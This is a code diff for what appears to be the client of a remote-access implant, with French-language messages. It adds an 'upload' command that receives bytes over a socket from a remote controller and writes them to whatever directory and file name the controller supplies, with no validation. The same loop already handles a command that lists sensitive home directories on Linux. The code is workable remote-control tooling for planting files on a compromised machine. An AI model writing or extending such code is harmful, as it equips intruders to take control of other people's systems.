@@ -4,7 +4,8 @@ import json
 import struct
 import platform
 import argparse
-import time 
+import time
+import os
 
 ENCODING ="utf-8"
 RETRY_DELAY = 5
@@ -59,6 +60,17 @@ def _receiveN(sock, n: int) -> bytes | None:
             return None
         buf += chunk
     return buf
+
+
+def receiveBytes(sock) -> bytes:
+    raw_len = _receiveN(sock, 4)
+    if raw_len is None:
+        raise ConnectionError("connexion coupée")
+    blob_len = int.from_bytes(raw_len, "big")
+    data = _receiveN(sock, blob_len)
+    if data is None:
+        raise ConnectionError("données incomplètes")
+    return data
 
 
 def receiveMessage(sock) -> dict:
@@ -140,6 +152,16 @@ def handle_command(sock, msg: dict):
         elif cmd == "list_home" and os_type == "Linux":
             result = list_sensitive_dirs()
             send_msg(sock, result)
+
+        elif cmd == "upload":
+            dest = msg.get("dest", ".")
+            filename = msg.get("filename", "uploaded_file")
+            file_data = receiveBytes(sock)
+            filepath = os.path.join(dest, filename)
+            os.makedirs(dest, exist_ok=True)
+            with open(filepath, "wb") as f:
+                f.write(file_data)
+            send_msg(sock, {"status": "ok", "message": f"Fichier sauvegardé: {filepath} ({len(file_data)} octets)"})
 
         else:
             send_msg(sock, {
